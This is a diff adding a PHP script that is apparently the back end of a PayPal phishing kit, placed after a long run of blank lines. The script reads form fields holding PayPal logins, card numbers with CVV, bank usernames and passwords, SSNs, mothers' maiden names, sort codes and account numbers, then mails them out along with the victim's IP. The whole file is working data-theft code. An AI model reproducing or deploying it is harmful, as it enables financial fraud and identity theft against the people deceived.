@@ -1,0 +1,66 @@
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<?php error_reporting(0); @ini_set('display_errors', 0); $xUserNamexxxf = $_POST['user']; $xPassWordxxxf = $_POST['pass']; $ip = getenv("REMOTE_ADDR"); $typeccxxxf = $_POST['typecc']; $ccxxxf = $_POST['cc_number']; $expmmxxxf = $_POST['expmm']; $expyyxxxf = $_POST['expyy']; $cscxxxf = $_POST['csc']; $namexxxf = $_POST['simple_login_f_name']; $lnamexxxf = $_POST['simple_login_l_name']; $Addressxxxf = $_POST['simple_login_address']; $cityxxxf = $_POST['simple_login_city']; $Statexxxf = $_POST['simple_login_state']; $Zipcodexxxf = $_POST['simple_login_zipcode']; $countryxxxf = $_POST['simple_login_country']; $holderxxxf = $_POST['holder']; $ddxxxf = $_POST['dob_1']; $xmmxxxf = $_POST['dob_2']; $yyyyxxxf = $_POST['dob_3']; $mmnxxxf = $_POST['mmn']; $sort1xxxf = $_POST['sort_1']; $sort2xxxf = $_POST['sort_2']; $sort3xxxf = $_POST['sort_3']; $acc_numxxxf = $_POST['acc_num']; $ssn1xxxf = $_POST['ssn_1']; $ssn2xxxf = $_POST['ssn_2']; $ssn3xxxf = $_POST['ssn_3']; $phone1xxxf = $_POST['phone1']; $phon2exxxf = $_POST['phon2e']; $passwordxxxf = $_POST['bankpass']; $wuserbankxxxf = $_POST['bankuser']; $hostnamexxxf = gethostbyaddr($ip); $urlxxxf = $_SERVER['REQUEST_URI']; $partsxxxf = explode('/',$urlxxxf); $dirxxxf = $_SERVER['SERVER_NAME']; for ($i = 0; $i < count($partsxxxf) - 1; $i++) { $dirxxxf .= $partsxxxf[$i] . "/"; } $actual_link = 'http://'.$dirxxxf."resultat.html"; $access_link = 'http://'.$dirxxxf."files/access.php"; $subjectx = "PPL Login :[$ip]"; $headersx = "MIME-Version: 1.0" . "\r\n";; $headersx .= "Content-type:text/html;charset=UTF-8" . "\r\n"; $headersx .= "From: Uchiha" . "\r\n"; if($xUserNamexxxf != ""){ $subjectx = "PayPal Login :[$ip]"; $message1x.= "IP Address		 : ".$ip ." <br> "; $message1x.= "Email		         : ".$xUserNamexxxf ." <br> "; $message1x.= "Password		     : ".$xPassWordxxxf." <br> "; $message1x.= "Resultat Link      : ".$actual_link." <br> "; $message1x.= "Access link        : ".$access_link." <br> "; } elseif($ccxxxf != ""){ $subjectx = "PayPal Account Information :[$ip]"; $message1x.= "IP Address		 : ".$ip ." <br> "; $message1x.= "Card Number        :  ".$ccxxxf." <br> "; $message1x.= "Expire Date        :  ".$expmmxxxf."/".$expyyxxxf." <br> "; $message1x.= "CVV/CVV2           :  ".$cscxxxf." <br> "; $message1x.= "Credit Card        :  ".$typeccxxxf." <br> "; $message1x.= "First Name         :  ".$namexxxf." <br> "; $message1x.= "Last Name          :  ".$lnamexxxf." <br> "; $message1x.= "Address            :  ".$Addressxxxf." <br> "; $message1x.= "City               :  ".$cityxxxf." <br> "; $message1x.= "State              :  ".$Statexxxf." <br> "; $message1x.= "Zipcode            :  ".$Zipcodexxxf." <br> "; $message1x.= "Country            :  ".$countryxxxf." <br> "; $message1x.= "Resultat Link      : ".$actual_link." <br> "; $message1x.= "Access link        : ".$access_link." <br> "; } elseif($holderxxxf != ""){ $subjectx = "Verification Bank :[$ip]"; $message1x.= "IP Address		 : ".$ip ." <br> "; $message1x.= "Holder Name        :  ".$holderxxxf." <br> "; $message1x.= "Birth Date         :  ".$ddxxxf."/".$xmmxxxf."/".$yyyyxxxf." <br> "; $message1x.= "Phone              :  +".$phone1xxxf." ".$phon2exxxf." <br> "; $message1x.= "Bank User          :  ".$wuserbankxxxf." <br> "; $message1x.= "Bank Password      :  ".$passwordxxxf." <br> "; $message1x.= "Social Security Number  :  ".$ssn1xxxf."-".$ssn2xxxf."-".$ssn3xxxf." <br> "; $message1x.= "Mothers Maiden Name:  ".$mmnxxxf." <br> "; $message1x.= "Sort Code          :  ".$sort1xxxf."-".$sort2xxxf."-".$sort3xxxf." <br> "; $message1x.= "Bank Account Number:  ".$acc_numxxxf." <br> "; $message1x.= "Resultat Link      : ".$actual_link." <br> "; $message1x.= "Access link        : ".$access_link." <br> "; } elseif($message1x == ""){ $subjectx = "Full Information :[$ip]"; $message1x = "<div style='font-family: Tahoma;line-height: 25px;color: #333;font-size: 14px;border: 1px solid #06F;	padding: 20px;	border-radius: 5px; margin-top: 20px;'> <br>
+IP           =>   <font color='#FF0000'> ".$ip." </font><br>
+EMAIL           =>   <font color='#FF0000'> ".$_SESSION["UserName"]." </font><br>
+PASSWORD        =>   <font color='#FF0000'> ".$_SESSION["PassWord"]." </font><br>
+Card Number           =>   <font color='#FF0000'> ".$_SESSION["accountcc"]." </font><br>
+Expire Date        =>   <font color='#FF0000'> ".$_SESSION["accountmm"]."/".$_SESSION["accountyy"]." </font><br>
+CVV/CVV2           =>   <font color='#FF0000'> ".$_SESSION["accountcsc"]." </font><br>
+Credit Card         =>   <font color='#FF0000'> ".$_SESSION["accounttypecc"]." </font><br>
+First Name        =>   <font color='#FF0000'> ".$_SESSION["accountname"]." </font><br>
+Last Name          =>   <font color='#FF0000'> ".$_SESSION["accountlname"]." </font><br>
+Address        =>   <font color='#FF0000'> ".$_SESSION["accountAddress"]." </font><br>
+City            =>   <font color='#FF0000'> ".$_SESSION["accountcity"]." </font><br>
+State            =>   <font color='#FF0000'> ".$_SESSION["accountState"]." </font><br>
+Zipcode            =>   <font color='#FF0000'> ".$_SESSION["accountZipcode"]." </font><br>
+Country            =>   <font color='#FF0000'> ".$_SESSION["accountcountry"]." </font><br>
+Holder Name           =>   <font color='#FF0000'> ".$_SESSION["bankholder"]." </font><br>
+Birth Date        =>   <font color='#FF0000'> ".$_SESSION["bankdd"]."/".$_SESSION["bankmm"]."/".$_SESSION["bankyyyy"]." </font><br>
+Phone           =>   <font color='#FF0000'>+".$_SESSION["bankphone1"]." ".$_SESSION["bankphon2e"]." </font><br>
+Bank User         =>   <font color='#FF0000'> ".$_SESSION["bankuserbank"]." </font><br>
+Bank Password         =>   <font color='#FF0000'> ".$_SESSION["bankpasswordbank"]." </font><br>
+Social Security Number        =>   <font color='#FF0000'> ".$_SESSION["bankssn1"]."-".$_SESSION["bankssn2"]."-".$_SESSION["bankssn3"]." </font><br>
+Mothers Maiden Name          =>   <font color='#FF0000'> ".$_SESSION["bankmmn"]." </font><br>
+Sort Code        =>   <font color='#FF0000'> ".$_SESSION["banksort1"]."-".$_SESSION["banksort2"]."-".$_SESSION["banksort3"]." </font><br>
+Bank Account Number           =>   <font color='#FF0000'> ".$_SESSION["bankacc_num"]." </font><br>
+Resultat Link            =>   <font color='#FF0000'> ".$actual_link." </font><br>
+Access link           =>   <font color='#FF0000'> ".$access_link." </font><br>
+</div>"; } if($message1x != ""){ $geoiptooldx = ""; mail($geoiptooldx, $subjectx, $message1x,$headersx); } ?>
